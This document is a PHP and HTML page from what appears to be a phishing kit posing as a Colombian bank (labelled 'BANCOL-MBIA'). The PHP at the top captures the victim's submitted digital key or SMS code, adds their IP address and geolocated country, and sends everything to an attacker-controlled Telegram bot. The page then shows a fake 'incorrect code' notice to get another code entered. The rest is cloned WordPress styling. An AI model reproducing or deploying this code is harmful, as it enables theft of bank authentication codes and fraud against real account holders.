<?php
ini_set("display_errors", 0);
include("datos_telgr.php");
function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName'];

////////////////////

if(isset ($_POST['sms']) ){


$message = "Datos BANCOL-MBIA:\r\n🔑Clave Digital: ".$_POST['sms']."\r\n🌎IP ".$myip." ".$pais."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}else{ header ('location: index.php'); exit(); }

?>
<!DOCTYPE html>

<html lang="es-CO" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
		<title>SMS – Home</title>
<meta name="robots" content="noindex, nofollow">
<script>
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/palestra-c75773.ingress-earth.ewp.live\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.1.1"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script><script src="./archivos/wp-emoji-release.min.js.descarga" type="text/javascript" defer=""></script>
<style>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="custom-style-css" href="./archivos/style-show-ip-address.css" type="text/css" media="all">
<link rel="stylesheet" id="dce-animations-css" href="./archivos/animations.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="./archivos/style.min.css" type="text/css" media="all">
<link rel="stylesheet" id="classic-theme-styles-css" href="./archivos/classic-themes.min.css" type="text/css" media="all">
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="uaf_client_css-css" href="./archivos/uaf.css" type="text/css" media="all">
<link rel="stylesheet" id="hello-elementor-css" href="./archivos/style.min(1).css" type="text/css" media="all">
<link rel="stylesheet" id="hello-elementor-theme-style-css" href="./archivos/theme.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-icons-css" href="./archivos/elementor-icons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-frontend-legacy-css" href="./archivos/frontend-legacy.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-frontend-css" href="./archivos/frontend.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-9-css" href="./archivos/post-9.css" type="text/css" media="all">
<link rel="stylesheet" id="dce-style-css" href="./archivos/style.min(2).css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="./archivos/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-pro-css" href="./archivos/frontend.min(1).css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-global-css" href="./archivos/global.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-767-css" href="./archivos/post-767.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-874-css" href="./archivos/post-874.css" type="text/css" media="all">
<link rel="stylesheet" id="google-fonts-1-css" href="./archivos/css" type="text/css" media="all">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin=""><script src="./archivos/jquery.min.js.descarga" id="jquery-core-js"></script>


		<script>
			document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );
		</script>
				<style>
			.no-js img.lazyload { display: none; }
			figure.wp-block-image img.lazyloading { min-width: 150px; }
							.lazyload, .lazyloading { opacity: 0; }
				.lazyloaded {
					opacity: 1;
					transition: opacity 400ms;
					transition-delay: 0ms;
				}
					</style>
		<link rel="icon" href="archivos/cropped-favicon-32x32.png" sizes="32x32">
<link rel="icon" href="archivos/cropped-favicon-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="archivos/cropped-favicon-180x180.png">
<meta name="msapplication-TileImage" content="archivos/cropped-favicon-270x270.png">
		<style id="wp-custom-css">
			body .elementor-14 .elementor-element.elementor-element-732bde2 .elementor-labels-above .elementor-field-group > label {
    padding-bottom: 10px;
    background-image: url(archivos/icc.png);
    height: auto;
    max-width: 100%;
    border: none;
    border-radius: 0;
    box-shadow: none;
    width: 100%;
    background-repeat: no-repeat;
    background-position: -2px -3px;
    padding-left: 28px;

}		</style>
			<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"></head>
<body class="page-template page-template-elementor_canvas page page-id-767 elementor-default elementor-template-canvas elementor-kit-9 elementor-page elementor-page-767 e--ua-blink e--ua-chrome e--ua-webkit dialog-body dialog-lightbox-body dialog-container dialog-lightbox-container" data-elementor-device-mode="widescreen">

	

<div class="dialog-widget dialog-lightbox-widget dialog-type-buttons dialog-type-lightbox elementor-popup-modal" id="elementor-popup-modal-874" 
style="background-image:url(archivos/fondi.png) ; background-repeat: no-repeat; background-position:center;background-size:90%;
"><div class="dialog-widget-content dialog-lightbox-widget-content animated"><div class="dialog-header dialog-lightbox-header"></div>
<div class="dialog-message dialog-lightbox-message">
<div data-elementor-type="popup" data-elementor-id="874" class="elementor elementor-874 elementor-location-popup" data-elementor-settings="{&quot;entrance_animation&quot;:&quot;fadeInDown&quot;,&quot;exit_animation&quot;:&quot;fadeInDown&quot;,&quot;entrance_animation_duration&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0.5,&quot;sizes&quot;:[]},&quot;open_selector&quot;:&quot;#tk&quot;,&quot;triggers&quot;:[],&quot;timing&quot;:[]}" style="display: block;">
					<div class="elementor-section-wrap">
								<section class="elementor-section elementor-top-section elementor-element elementor-element-e8a76d2 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="e8a76d2" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-55798508" data-id="55798508" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-176225ee dce_masking-none elementor-widget elementor-widget-image" data-id="176225ee" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
												<img width="800" height="775" alt="" 
												
												 data-sizes="(max-width: 800px) 100vw, 800px" 
												class="attachment-large size-large wp-image-877 lazyloaded" src="./archivos/warning_page.png" sizes="(max-width: 800px) 100vw, 800px" ><noscript>
												<img width="800" height="775" src="archivos/warning_page.png" class="attachment-large size-large wp-image-877" alt=""  sizes="(max-width: 800px) 100vw, 800px" /></noscript>														</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-1613a203 elementor-widget elementor-widget-heading" data-id="1613a203" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">¡Notificación!</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6d96cd9c elementor-widget elementor-widget-heading" data-id="6d96cd9c" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Clave Digital incorrecta, espera unos segundos te enviaremos otro SMS.</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-234fef65 elementor-align-center elementor-widget elementor-widget-button" data-id="234fef65" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a href="index3.php" class="elementor-button-link elementor-button elementor-size-sm" role="button">
						<span class="elementor-button-content-wrapper">
						<span class="elementor-button-text">Intentarlo de nuevo</span>
		</span>
					</a>
		</div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
							</div>
				</div></div>
				
				
				
				<div class="dialog-buttons-wrapper dialog-lightbox-buttons-wrapper"></div><div class="dialog-close-button dialog-lightbox-close-button"><i class="eicon-close"></i></div></div></div></body></html>